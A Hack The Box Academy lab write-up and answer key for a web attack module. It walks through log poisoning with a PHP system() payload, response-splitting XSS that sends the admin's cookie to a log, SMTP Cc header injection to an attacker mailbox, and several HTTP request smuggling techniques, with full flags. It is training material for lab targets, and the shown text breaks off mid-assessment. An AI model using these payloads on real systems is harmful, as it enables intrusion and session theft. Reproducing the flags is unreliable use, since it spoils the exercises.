| Section                           | Question Number | Answer                                |
| --------------------------------- | --------------- | ------------------------------------- |
| Log Injection                     | Question 1      | HTB{89fd0bf9a7bcf2d1a2cd7aab5189f175} |
| HTTP Response Splitting           | Question 1      | HTB{d7f23c50eaddb4f2d339c23297db3577} |
| SMTP Header Injection             | Question 1      | HTB{ba4686506d821d07f74ce3b1e0906f4f} |
| CL.TE                             | Question 1      | HTB{6f8ed4c4a92b33a53094da44a12e5a64} |
| TE.TE                             | Question 1      | HTB{699650b6ad3ac23a88b5220995b7aa64} |
| TE.CL                             | Question 1      | HTB{c73a37d8fbef9c32ce29b8c722922ef1} |
| Vulnerable Software               | Question 1      | HTB{3fa227ff36e842c302c7121e673d502e} |
| Exploitation of Request Smuggling | Question 1      | HTB{9ddd29fda379175be3d2ed1e6620677d} |
| HTTP/2 Downgrading                | Question 1      | HTB{ea040e3c74e2904b60d8392a1fff566b} |
| Skills Assessment                 | Question 1      | HTB{c0ee118e22005accb5648f286d1c1278} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Log Injection

## Question 1

### "Try to use what you learned in this section to obtain RCE via log poisoning and submit the flag. You can access the log at /log.php"

After spawning the target machine, students need to visit its website's root webpage and scroll down to find a "Contact Me" form, noticing that there is a pop-up notification stating that the website "implements state of the art logging mechanisms to log malicious contact requests":

![[HTB Solutions/CWEE/z. images/39805581e4a690e9037e6103176394bd_MD5.jpg]]

Knowing that, students need to try to inject PHP code in the message field in an attempt to read the contents of the flag file `/flag.txt`:

![[HTB Solutions/CWEE/z. images/cbd5ef66ee39f15266fdea58919bc8d8_MD5.jpg]]

However, students will notice that the message has been logged:

![[HTB Solutions/CWEE/z. images/3e6d25df8e4cc4383cf35303928f56c9_MD5.jpg]]

When checking the logs over `http://STMIP:STMPO/log.php`, students will notice that the message field is being sanitized:

![[HTB Solutions/CWEE/z. images/b60968da1f4f7c6b28be83383713fc7a_MD5.jpg]]

Subsequently, students need to use `Burp Suite` to intercept the same request with the dummy data, sending it to `Repeater` (`Ctlr` + `R`). When injecting the same PHP payload in the `name` field but keeping the value of the `message` field benign, students will notice that the message gets forwarded and not logged (students need to encode spaces as plus signs because the `Content-Type` header has the value `application/x-www-form-urlencoded`):

Code: http

```http
name=<?php+system("cat+/flag.txt");+?>&email=ryansam%40gmail.com&phone=123&message=Hello+Freelancer
```

![[HTB Solutions/CWEE/z. images/8735340a522877475256e72870da7828_MD5.jpg]]

Thus, unless the `message` field is fed malicious input, the message will not be logged. Students need to poison the log files by keeping the value of the `name` field as the PHP payload in addition to the `message` holding the same payload:

Code: http

```http
name=<?php+system("cat+/flag.txt");+?>&email=ryansam%40gmail.com&phone=123&message=<?php+system("cat+/flag.txt");+?>
```

![[HTB Solutions/CWEE/z. images/268202247b7ad5461769378ba58cb6ce_MD5.jpg]]

Checking the logs again over `http://STMIP:STMPO/log.php` (viewing the page source will output each log entry in a new line), students will attain the flag `HTB{89fd0bf9a7bcf2d1a2cd7aab5189f175}` as the value of the `name` field:

![[HTB Solutions/CWEE/z. images/b8894119abd396346926078e9d14c6c4_MD5.jpg]]

Answer: `HTB{89fd0bf9a7bcf2d1a2cd7aab5189f175}`

# HTTP Response Splitting

## Question 1

### "Try to use what you learned in this section to steal the admin user's cookie via XSS."

After spawning the target machine, students need to visit its website's root webpage to notice that they can report issues to the admin user, passing an "Issue URL" that can be sent via the "Redirector" service:

![[HTB Solutions/CWEE/z. images/082c04d502e0ca3990184408a2e111d9_MD5.jpg]]

Students need to test whether the "Redirector" service form suffers from `HTTP Response Splitting`. Students need to use `Burp Suite` to intercept the request and send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/05bb093fefb1b42190db640db3b60fba_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/88d3f7c2a15b6cb44dfc6635bee4f586_MD5.jpg]]

To test for `HTTP Response Splitting`, students need to use the `CRLF` character sequence and then provide an arbitrary header along a value. When inspecting the response, students will notice that the web server is vulnerable to `HTTP Response Splitting`, as the user input got reflected in the HTTP headers without proper sanitization:

Code: http

```http
GET /?target=academy.hackthebox.com%0d%0aInjected:+True HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/3aaee6dde665d17d6473f5d262fff872_MD5.jpg]]

Subsequently, students need to test if they can inject JavaScript into the response's body to attempt an XSS attack by having two `CRLF` characters sequence; however, they will notice that the response's body is not being rendered/treated as HTML, due to the the `Content-Type` header being set to `text/plain` by the web server:

Code: http

```http
GET /?target=academy.hackthebox.com%0d%0a%0d%0a<html><script>alert("Injected+JS+in+body")</script></html> HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/656d8f2653ecb51fc0c6b3003ba0f20c_MD5.jpg]]

Therefore, students need to override the default `Content-Type` header provided by the web server by injecting another one with the value of `text/html`, making the web browser render the HTML when receiving the request (otherwise, the admin will not be coerced into revealing the cookie due to the JavaScript payload not being executed):

Code: http

```http
GET /?target=academy.hackthebox.com%0d%0aContent-Type:+text/html%0d%0a%0d%0a<html><script>alert("Injected+JS+in+body")</script></html> HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/25e48c60e45c1a8cc31c9e9194eaf89a_MD5.jpg]]

Moreover, students need to notice that the web server is using the HTTP `302 Found` status code along with the `Location` header to facilitate redirections based on the value passed to `/?target=` (which is `academy.hackthebox.eu` in here, without the subsequent payload), forcing the web browser into immediately redirecting the admin user without the XSS payload which reveals the cookie being executed. To circumvent this, students need to supply an empty value for the `Location` header, which is deemed invalid by the browser as it does not know where to navigate, forcing it to display the response body and execute the XSS payload:

Code: http

```http
GET /?target=%0d%0aContent-Type:+text/html%0d%0a%0d%0a<html><script>alert("Injected+JS+in+body")</script></html> HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/7d19d6aa51a93f058441a1585ab96943_MD5.jpg]]

Now, students need to steal the cookie of the admin user by coercing the admin into requesting the webpage `/?admin` with the document's cookie since that will report the cookie value in the report log over `http://STMIP:STMPO/log`. Students need to utilize [document.location](https://developer.mozilla.org/en-US/docs/Web/API/Document/location) to send the cookie value to `/?admin=`:

Code: javascript

```javascript
<script>document.location='/?admin='+document.cookie;</script>
```

The resultant "issue URL" that will be sent for the admin becomes:

Code: shell

```shell
%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><script>document.location='/?admin='+document.cookie;</script></html>
```

However, students need to keep in mind that there will be two requests until the desired XSS payload reaches the admin:

1. The request to `/?admin=` to report the "Issue URL" to the admin user; since the payload is contained within the `admin` GET parameter, students need to URL-encode special characters once.
2. The request to `/?target=` that students will report to the admin user in the `admin` GET parameter in the first request; since the payload is contained within the `target` GET parameter, students need to URL-encode special characters twice.

The special characters `CRLF` (i.e., `%0d%0a` --> `%250d%250a`, [Recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)&input=JTBkJTBh)), white-space (i.e.,  --> `%2520`, [Recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)URL_Encode\(true\)&input=IA)), equals symbol (i.e., `=` --> `%253D`, [Recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)URL_Encode\(true\)&input=PQ)) and the plus symbol (i.e., `+` --> `%252B`, [Recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)URL_Encode\(true\)&input=Kw)) need to be URL-encoded two times (except for `%0d%0a`, which needs to be URL-encoded only one time since it is already in URL-encoding), attaining the payload:

Code: http

```http
%250d%250aContent-Type:%2520text/html%250d%250a%250d%250a<html><script>document.location%253D'/?admin='%252Bdocument.cookie;</script></html>
```

At last, with the attained payload, students need to send it to the admin to inspect via the "Issue URL" form, making sure to set the payload after `/?target=`:

![[HTB Solutions/CWEE/z. images/0bfcba3791914c9d730a204e718e87ce_MD5.jpg]]

After clicking and waiting for a few seconds for the admin to inspect the link, students need to check the log file over `http://STMIP:STMPO/log` to attain the flag `HTB{d7f23c50eaddb4f2d339c23297db3577}` as the value of the cookie `AdminCookie`:

![[HTB Solutions/CWEE/z. images/8706827cf93d596c53d8d268783f416c_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/434154baf50159d108a1f56abfa44d98_MD5.jpg]]

Answer: `HTB{d7f23c50eaddb4f2d339c23297db3577}`

# SMTP Header Injection

## Question 1

### "Try to use what you learned in this section to steal the sensitive information sent to the admin user in an email. Your email address is evil@attacker.htb. The emails can be accessed on the vhost mail.smtpinjection.htb."

After spawning the target machine, students first need to add the vHost entry `mail.smtpinjection.htb` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP mail.smtpinjection.htb" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.2]─[htb-ac413848@htb-mjn7xdw2hs]─[~]
└──╼ [★]$ sudo sh -c 'echo "165.227.228.154 mail.smtpinjection.htb" >> /etc/hosts'
```

Subsequently, when visiting the root webpage of the spawned target machine's website and scrolling down to "Contact Me", students will notice that it says all messages are sent to the admin via email:

![[HTB Solutions/CWEE/z. images/dbd6a51f012909b4bfdbb65676642333_MD5.jpg]]

Additionally, the question mentions that sensitive information is being sent to the admin user in the sent email(s). Thus, students need to get a copy of the email being sent to the admin. First, students need to fill the form with dummy data and click on `Submit` to intercept the request with `Burp Suite` and send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/9037785dd0255b96c34ebe4eae9929e3_MD5.jpg]]

In the post form fields, students need to inject the `CRLF` sequence and use the SMTP header `Cc` (`Carbon copy`) with the value `evil@attacker.htb` to attempt to receive a copy from the email being sent to the admin:

Code: http

```http
name=ryansam%40gmail.com%0d%0aCc:+evil@attacker.htb&phone=123&message=Hello+Admin
```

![[HTB Solutions/CWEE/z. images/fb698ff08e30f0ee4de48041f691db54_MD5.jpg]]

However, when checking the email inbox over `http://mail.smtpinjection.htb:STMPO/`, students will notice that no copy of the email has been received:

![[HTB Solutions/CWEE/z. images/835b4132c9cc53b1015894ac1ca066ae_MD5.jpg]]

Most probably, the application is appending additional data to the value of the injection point (i.e., the username field's value, which matches the first header, `Cc`), thus invalidating the email address `evil@attacker.htb`. To circumvent this, students need to inject an additional dummy header after the `Cc` header:

Code: http

```http
name=ryansam%40gmail.com%0d%0aCc:+evil@attacker.htb%0d%0aDoesNotExist:+True&phone=123&message=Hello+Admin
```

![[HTB Solutions/CWEE/z. images/56125437e4283c363f75c3850354c90a_MD5.jpg]]

Checking the email inbox over `http://mail.smtpinjection.htb:STMPO/`, students will notice that this time an email has been received:

![[HTB Solutions/CWEE/z. images/f8181398496801ec1becbfc9c2d3f7f1_MD5.jpg]]

Opening it, students will find the flag `HTB{ba4686506d821d07f74ce3b1e0906f4f}`:

![[HTB Solutions/CWEE/z. images/4f27db742572275105a7eb407ff4ee1e_MD5.jpg]]

(In case students are curious to know what data/string the web application is appending to the `Cc` header (or, more precisely, the username value used in the form), they can check the `Source` tab, to find out it is appending the domain name `@smtpinjection.htb`):

![[HTB Solutions/CWEE/z. images/64c7aa984ba1cc56099398b9f4e803b1_MD5.jpg]]

Answer: `HTB{ba4686506d821d07f74ce3b1e0906f4f}`

# CL.TE

## Question 1

### "Try to use what you learned in this section to exploit request smuggling to force the admin user to reveal the flag."

After spawning the target machine, students need to visit its website's root webpage and click on the "Admin Area" button:

![[HTB Solutions/CWEE/z. images/d478c4c6624430d4ac7c677506fa4532_MD5.jpg]]

When intercepting the request sent after clicking on the `Reveal Flag` button, students will notice that it is making a GET request to the URL `/admin.php?reveal_flag=1`:

![[HTB Solutions/CWEE/z. images/465b3c82f2bfaac6e990f6807592492e_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/8e380a4714e5e60cdfe12e9020a2ae8d_MD5.jpg]]

Since only the admin is allowed to reveal the flag, students need to test if the setting/deployment of the application/system is vulnerable to `CL.TE`, where the reverse proxy does not support chunked encoding, whereby if a request contains both `Content-Length` and `Transfer-Encoding`, the reverse proxy will incorrectly utilize the `Content-Length` header to determine the request length. In contrast, the web server will correctly utilize the `Transfer-Encoding` header to determine the request length.

Within `Repeater`, students need to have two tabs open with two requests, the first being a POST request to `/`:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

![[HTB Solutions/CWEE/z. images/62dd893e525d90ce6437eaae0d9fb1f7_MD5.jpg]]

While the second is a GET request to `/`:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
```

![[HTB Solutions/CWEE/z. images/bdf77ad2428f1ac93bb9816076ebba40_MD5.jpg]]

Students need to send the POST request first and then send the second GET one very rapidly. Attaining `405 Not Allowed` for the GET request to `/` indicates that the application deployment is vulnerable to `CL.TE`:

![[HTB Solutions/CWEE/z. images/36e94375597d4d9c55873a18a9ebdc23_MD5.jpg]]

Now that students have confirmed the deployment vulnerable to `CL.TE`, they need to coerce the admin into revealing the flag by sending a GET request to `/admin.php?reveal_flag=1`:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 59
Transfer-Encoding: chunked

0

GET /admin.php?reveal_flag=1 HTTP/1.1
DoesNotMatter:
```

![[HTB Solutions/CWEE/z. images/379b58ce234370f43a3b7d076f4e0529_MD5.jpg]]

The admin will access the root webpage, most probably with a cookie value, as in the request:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
Cookie: sess=ADMIN_COOKIE_VALUE
```

From the perspective of the reverse proxy, which uses the `CL` header to determine the length of the first request such that it ends just after `DoesNotMatter: `, the TCP stream becomes to contain a POST request to `/` and a GET request to `/` by the admin user:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 59
Transfer-Encoding: chunked

0

GET /admin.php?reveal_flag=1 HTTP/1.1
DoesNotMatter: GET / HTTP/1.1
Host: STMIP:STMPO
Cookie: sess=ADMIN_COOKIE_VALUE
```

However, from the perspective of the web server, which correctly uses the `chunked encoding`, it determines that the first request ends with the empty chunk; therefore, the TCP stream becomes to contain a POST request to `/`, in addition to a GET request to `/admin.php?reveal_flag=1` by the admin supplying their admin cookie. Due to the second GET request being authenticated (due to the session cookie of the admin being sent along in it), the GET request to `/admin.php?reveal_flag=1` succeeds.

After waiting for around 10 seconds and then accessing `http://STMIP:STMPO/admin.php`, students will notice that the admin has been forced into revealing the flag `HTB{6f8ed4c4a92b33a53094da44a12e5a64}`:

![[HTB Solutions/CWEE/z. images/92958eb0b6423dec887587a0cd306a23_MD5.jpg]]

Answer: `HTB{6f8ed4c4a92b33a53094da44a12e5a64}`

# TE.TE

## Question 1

### "Try to use what you learned in this section to exploit request smuggling to force the admin user to reveal the flag. The exploit is time-sensitive so you need to send your payload just before the admin accesses the page. Sending the request periodically about once every second should work. The admin accesses the page every 10 seconds."

After spawning the target machine, students need to visit its website's root webpage and click on the "Admin Area" button:

![[HTB Solutions/CWEE/z. images/305ab50885f8e4db7c66dffa3b71125e_MD5.jpg]]

When intercepting the request sent after clicking on the `Reveal Flag` button, students will notice that it is making a GET request to the URL `/admin.php?reveal_flag=1`:

![[HTB Solutions/CWEE/z. images/a0de4b90850db7500689f82b24389c6d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/96868059d1d46f165cc3521f10e2fc1d_MD5.jpg]]

Since only the admin is allowed to reveal the flag, students need to test if the setting/deployment of the application/system is vulnerable to `TE.TE`, where both the reverse proxy and web server support chunked encoding; however, one of the two systems does not follow the specification precisely such that it is possible to manipulate the `Transfer-Encoding` header to make one of the two systems accept it while the other rejects it, forcing it to fall back to utilizing the `Content-Length` header.

Within `Repeater`, students need to have a POST request to `/`, most importantly, tricking the reverse proxy into ignoring the `Transfer-Encoding` header with the `Vertical Tab Separator` method:

![[HTB Solutions/CWEE/z. images/438f5d1f1db4a2789edb304919d1c012_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/b0cf8dd5b99901268ee1bf0994837304_MD5.jpg]]

After sending the request two times very rapidly, students will attain a `405 METHOD NOT ALLOWED`, thus successfully obfuscating the `Transfer-Encoding` header from the reverse proxy, which effectively leads to a `CL.TE`:

![[HTB Solutions/CWEE/z. images/2cf3ec299d4dcdcae24ac49bea580d3a_MD5.jpg]]

Now that students have confirmed the deployment is vulnerable to `CL.TE` (via the `Vertical Tab Separator` `TE.TE` method), they need to coerce the admin into revealing the flag by sending a GET request to `/admin.php?reveal_flag=1`, most importantly, tricking the reverse proxy into ignoring the `Transfer-Encoding` header with the `Vertical Tab Separator` method. Students need to send this request every second for 10 seconds, as the admin visits the root webpage every 10 seconds:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 44
Transfer-Encoding:chunked

0

GET /admin?reveal_flag=1 HTTP/1.1
FOO:
```

After sending the requests periodically, students will attain the flag `HTB{699650b6ad3ac23a88b5220995b7aa64}` in the "Admin Area":

![[HTB Solutions/CWEE/z. images/ee1cb1b48171d9e71c470dc8cab05ed0_MD5.jpg]]

Answer: `HTB{699650b6ad3ac23a88b5220995b7aa64}`

# TE.CL

## Question 1

### "Try to use what you learned in this section to exploit request smuggling to bypass the WAF and access the admin portal."

After spawning the target machine and visiting its website's root webpage, students need to click on the "Admin Area" button, to notice that it displays the message "Unauthorized":

![[HTB Solutions/CWEE/z. images/5ff9beb760f55e2d61259c4526575913_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/389ed3be0673959137ecaaf0742ba06b_MD5.jpg]]

Therefore, the deployment setting/architecture is most probably utilizing a `WAF` that prevents access to the webpage. Students need to test if the setting/deployment of the application/system is vulnerable to `TE.CL`, where the reverse proxy parses the `Transfer-Encoding` header and the web server uses the `Content-Length` header to determine the request length.

To do so, students need to have two tabs open in `Repeater`, one having a POST request to `/`, most importantly, tricking the reverse proxy into ignoring the `Transfer-Encoding` header with the `Substring match` method:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 3
Transfer-Encoding: asdchunked

5
HELLO
0
```

![[HTB Solutions/CWEE/z. images/2c60ec40b5008029d7a789f8d1158829_MD5.jpg]]

While the other tab has a GET request to `/`:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
```

![[HTB Solutions/CWEE/z. images/dabafd06da73fe316effd32f4f3c72ce_MD5.jpg]]

Afterward, students need to group the two tabs, set the sending option to `Send group (single connection)`, and untick `Update Content-Length` for the POST request:

![[HTB Solutions/CWEE/z. images/a192ce35ba8fcd8eb8461769665846f9_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/9e7e2efc7062a7e5b05f1dc99702511e_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/2739303f524aed890e661ab3b70efeee_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/0e138c51f65351f02ba3acab68ade979_MD5.jpg]]

After sending the requests and checking their responses, students will notice that the GET request received a `400 Bad Request` response, as it was influenced by the first request:

![[HTB Solutions/CWEE/z. images/6da3ec567836361fe1c43c0ce1953e16_MD5.jpg]]

Now that students have confirmed that the deployment is vulnerable to `TE.CL` (via the `Substring match` `TE.TE` method), they need to smuggle a request to the `/admin` webpage by sending two GET requests to `/404`. To calculate the chunk size, students can highlight all of the smuggled request up until before the empty chunk and convert the number of characters from decimal to hexadecimal (51 is 33 in hex):

Code: http

```http
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: asdchunked

33
GET /admin HTTP/1.1
Host: STMIP:STMPO
  

0
```

![[HTB Solutions/CWEE/z. images/58e76cac7ed26f523a1e956cd9408ab4_MD5.jpg]]

While the second request is also a GET to `/404`:

Code: http

```http
GET /404 HTTP/1.1
Host: STMIP:STMPO
```

After sending both requests in a single connection, students will notice that the first requests got received a `404 Not Found` response:

![[HTB Solutions/CWEE/z. images/d6d9bd13e51cb91b61ef2d4113cbb5a6_MD5.jpg]]

While the second request's response contains the flag `HTB{c73a37d8fbef9c32ce29b8c722922ef1}` as it returned the `/admin` webpage:

![[HTB Solutions/CWEE/z. images/2ee6c02ddb511257124068d40460d9a3_MD5.jpg]]

Answer: `HTB{c73a37d8fbef9c32ce29b8c722922ef1}`

# Vulnerable Software

## Question 1

### "Try to use what you learned in this section to exploit request smuggling to bypass the WAF and access the admin portal."

After spawning the target machine and visiting its website's root webpage, students need to click on the "Admin Area" button, to notice that it displays the message "Unauthorized":

![[HTB Solutions/CWEE/z. images/afb83b429b1613fca5c5320950430d5b_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/73c434ff653d6388b7a678238f7e30ed_MD5.jpg]]

Therefore, the deployment setting/architecture is most probably utilizing a `WAF` that prevents access to the webpage. When analyzing the response of the request to the root webpage, students will notice that the web server is `Gunicorn 20.0.4`, which suffers from a request [smuggling vulnerability](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/) due to a bug when encountering the HTTP header `Sec-WebSocket-Key1` that fixed the request body to the length of 8 bytes, no matter what value the headers `Content-Length` and `Transfer-Encoding` is set to:

![[HTB Solutions/CWEE/z. images/3c9eec5b93e84ae5b1ff160521faaf2a_MD5.jpg]]

To test if the vulnerability can be exploited, students need to have two tabs open in `Repeater`, one holding a GET request to `/` with a smuggled GET request to `/404`:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 0
Sec-WebSocket-Key1: x

xxxxxxxxGET /404 HTTP/1.1
Host: STMIP:STMPO
```

![[HTB Solutions/CWEE/z. images/113551603c9ff60b39a0e0b12b0bb134_MD5.jpg]]

In addition to the second also being a GET request to `/`:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
```

![[HTB Solutions/CWEE/z. images/4e88029ed02a935663a294459cf7d89b_MD5.jpg]]

Afterward, students need to group the two tabs together, setting the sending option to `Send group (single connection)`:

![[HTB Solutions/CWEE/z. images/427d90a88dfb2b08b12e3b8f2b9945bc_MD5.jpg]]

After sending both requests over a single connection, students will notice that the first GET request to `/` returns a `200 OK` status code:

![[HTB Solutions/CWEE/z. images/95104efdbd673f7b7cd05cc003c1f3fe_MD5.jpg]]

However, the second GET request to `/` returns a `404 NOT FOUND` status code:

![[HTB Solutions/CWEE/z. images/29f0dd26a9995242d1d65a8a3e3cb250_MD5.jpg]]

Now that students have confirmed that they can exploit the request smuggling vulnerability, they need to smuggle a GET request to `/admin` instead of `/404`:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 59
Sec-WebSocket-Key1: x

xxxxxxxxGET /admin HTTP/1.1
Host: STMIP:STMPO
```

After sending both requests over a single connection, students will notice that, as intended, the response to the first request is a `200 OK`:

![[HTB Solutions/CWEE/z. images/79816f90ab20ea493094ff7f793c9387_MD5.jpg]]

While for the second response, the `WAF` has been bypassed, as students have accessed `/admin`, which contains the flag `HTB{3fa227ff36e842c302c7121e673d502e}` in line 60:

![[HTB Solutions/CWEE/z. images/382bff0fd9ab5214631c5ebc81fcb83c_MD5.jpg]]

Answer: `HTB{3fa227ff36e842c302c7121e673d502e}`

# Exploitation of Request Smuggling

## Question 1

### "Try to use what you learned in this section to exploit request smuggling to steal the admin user's session cookie and access the admin panel."

After spawning the target machine and visiting its website's root webpage, students need to click on the "Admin Area" button, to notice that it displays the message "Unauthorized":

![[HTB Solutions/CWEE/z. images/fc6345cf8c1d10767553cebd554da099_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/c290b28c8b216ef9fd34cc1ad6b4740f_MD5.jpg]]

Students need to test if the setting/deployment of the application/system is vulnerable to `CL.TE`, where the reverse proxy does not support chunked encoding, whereby if a request contains both `Content-Length` and `Transfer-Encoding`, the reverse proxy will incorrectly utilize the `Content-Length` header to determine the request length. In contrast, the web server will correctly utilize the `Transfer-Encoding` header to determine the request length.

Within `Repeater`, students need to have two tabs open with two requests, the first being a POST request to `/`:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

While the second is a GET request to `/`:

Code: http

```http
GET / HTTP/1.1
Host: STMIP:STMPO
```

Students need to send the POST request first and then send the second GET request very rapidly. Attaining `405 Not Allowed` for the GET request to `/` indicates that the application deployment is vulnerable to `CL.TE`:

![[HTB Solutions/CWEE/z. images/381ba70a7a426b67981b6041c2c1e906_MD5.jpg]]

Now, to steal the admin's session cookie, students first need to log in with the credentials `htb-stdnt:Academy_student!` (without logging in, students will not be able to post comments):

![[HTB Solutions/CWEE/z. images/4644eca4e22f0a71a8e36060015df208_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f8c970eed4ea05f0be0d402bf8bb299d_MD5.jpg]]

Students need to leave a comment with any arbitrary data and intercept the request with `Burp Suite` to send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/f99d751b1b2686838123938239fc6b00_MD5.jpg]]

Since students have identified beforehand that the deployment setting suffers from `CL.TE`, they need to coerce the admin to post their request as a comment that will be publicly displayed (students need to replace the values of `PHPSESSID` and `csrf` tokens with the one they attain; additionally, they can determine that 300 is the appropriate value for the `Content-Length` header with trial-and-error). Students must place the `csrf` POST field at the beginning, as otherwise it would be invalidated by the admin's request that will get appended:

Code: http

```http
POST / HTTP/1.1
Host: STMIP:STMPO
Content-Type: application/x-www-form-urlencoded
Content-Length: 235
Transfer-Encoding: chunked

0

POST /comments.php HTTP/1.1
Host: STMIP:STMPO
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Cookie: PHPSESSID=7hgqcc2a31mbktd315h955n7v0

csrf=64090f99b1e192.41079284&name=RyanSam&comment=Testing
```

![[HTB Solutions/CWEE/z. images/04306b5ea0f3f8553c344ede98049e90_MD5.jpg]]

After sending the request and waiting for 10 seconds, students will find that the admin has been coerced into submitting their GET request to `/` as a comment, thus, exposing the session cookie `session=fd1dt4khy36dthmc`:

![[HTB Solutions/CWEE/z. images/a8df6f1e694676962b08726a7cad152d_MD5.jpg]]

Students need to navigate to the "Admin Area" and edit the already existing cookie to that of the admin, `session=fd1dt4khy36dthmc`:

![[HTB Solutions/CWEE/z. images/05cf391d382036dd2f5b96c3d1aabe85_MD5.jpg]]

After refreshing the webpage, students will attain access to the admin panel and find the flag `HTB{9ddd29fda379175be3d2ed1e6620677d}`:

![[HTB Solutions/CWEE/z. images/93b075c5b85ab4a3287e4a95898fafcb_MD5.jpg]]

Answer: `HTB{9ddd29fda379175be3d2ed1e6620677d}`

# HTTP/2 Downgrading

## Question 1

### "Try to use what you learned in this section to exploit request smuggling due to HTTP/2 downgrading to force the admin user to reveal the flag. NOTE: you need to access the lab via HTTPS."

After spawning the target machine, students need to visit the website's root webpage using `HTTPs`:

![[HTB Solutions/CWEE/z. images/5c5f827f3598770214de5f81eba2c5b9_MD5.jpg]]

Students then need to click on the "Admin Area" button:

![[HTB Solutions/CWEE/z. images/9feb4baae80225835bb73b9fbb60977f_MD5.jpg]]

Students need to intercept the request sent when clicking on the "Reveal Flag" button:

![[HTB Solutions/CWEE/z. images/02beb64b70a3af1e1bc223352dea3368_MD5.jpg]]

Students will notice that the button sends a GET request to `/admin/index.php?reveal_flag=1` over `HTTP/1.1`:

![[HTB Solutions/CWEE/z. images/a4643160f9f5aea2a7ffaa7157015bb1_MD5.jpg]]

When intercepting the request to the root webpage, students will notice it is utilizing `HTTP/2`:

![[HTB Solutions/CWEE/z. images/9b0c22853374be0f45be4d69a31e876b_MD5.jpg]]

Therefore, students need to attempt request smuggling due to `HTTP/2 downgrading` to force the admin into sending the GET request to `/admin/index.php?reveal_flag=1`, hoping that the reverse proxy does not properly validate the value of the `Content-Length` header and instead rewrites it to `HTTP/1.1` using the provided faulty header, which results in an `H2.CL` vulnerability:

Code: http

```http
POST / HTTP/2
Host: STMIP:STMPO
Content-Length: 0

GET /admin/index.php?reveal_flag=1 HTTP/1.1
Host: STMIP:STMPO
```

Students must untick the `Update Content-Length` option, then send the request:

![[HTB Solutions/CWEE/z. images/e46c861a312a8951604dd718a6e62666_MD5.jpg]]

After waiting for 10 seconds and visiting the "Admin Area", students will notice that the flag `HTB{ea040e3c74e2904b60d8392a1fff566b}` has been revealed:

![[HTB Solutions/CWEE/z. images/0c43230b9ed7765bb1fbdab1f897fe0d_MD5.jpg]]

Answer: `HTB{ea040e3c74e2904b60d8392a1fff566b}`

# Skills Assessment

## Question 1

### "Combine the vulnerabilities you have learned about in this module to steal sensitive information and bypass the WAF to obtain the flag."

After spawning the target machine, students need to visit its website's root webpage and click on the "Contact" button:

![[HTB Solutions/CWEE/z. images/f2e042e4c66f8517dfda81e358bf3000_MD5.jpg]]

Students will notice that they can contact the system administrator via a form; thus, they need to fill it with dummy data and intercept the request:

![[HTB Solutions/CWEE/z. images/5e0822326a51d9117a4f1f74656999ea_MD5.jpg]]

Since the form is asking for the email address of the sender and the scenario states that the client provided the email address `attacker@evil.htb`, it is most probably sending the message via SMTP; therefore, students need to attempt exploiting SMTP header injection. However, students will notice that the `WAF` blocks requests containing the `CRLF` characters sequence:

```http
name=Ryan+Sam&email=ryansam%40gmail.com%0d%0aCc:attacker@evil.htb&message=Hello+Sys+Admin
```

![[HTB Solutions/CWEE/z. images/5032ae02a3a758a492e02d5f4a67db27_MD5.jpg]]

